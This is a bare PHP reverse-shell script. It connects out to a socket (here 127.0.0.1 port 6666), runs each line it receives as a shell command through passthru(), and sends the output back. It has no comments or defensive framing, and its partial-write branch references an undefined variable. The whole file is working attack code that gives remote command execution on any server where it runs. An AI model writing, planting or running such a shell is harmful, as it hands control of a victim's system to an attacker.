<?php
  $address="127.0.0.1";
  $port="6666";
  $buff_size=2048;
  $timeout=120;
  $sock=fsockopen($address,$port) or die("Cannot create a socket");
  while ($read=fgets($sock,$buff_size)) {
      $out="";
      if ($read) {
          if (strcmp($read,"quit")===0 || strcmp($read,"q")===0) {
              break;
          }
          ob_start();
          passthru($read);
          $out=ob_get_contents();
          ob_end_clean();
      }
      $length=strlen($out);
      while (1) {
          $sent=fwrite($sock,$out,$length);
          if ($sent===false) {
              break;
          }
          if ($sent<$length) {
              $st=substr($st,$sent);
              $length-=$sent;
          } else {
              break;
          }
      }
  }
  fclose($sock);
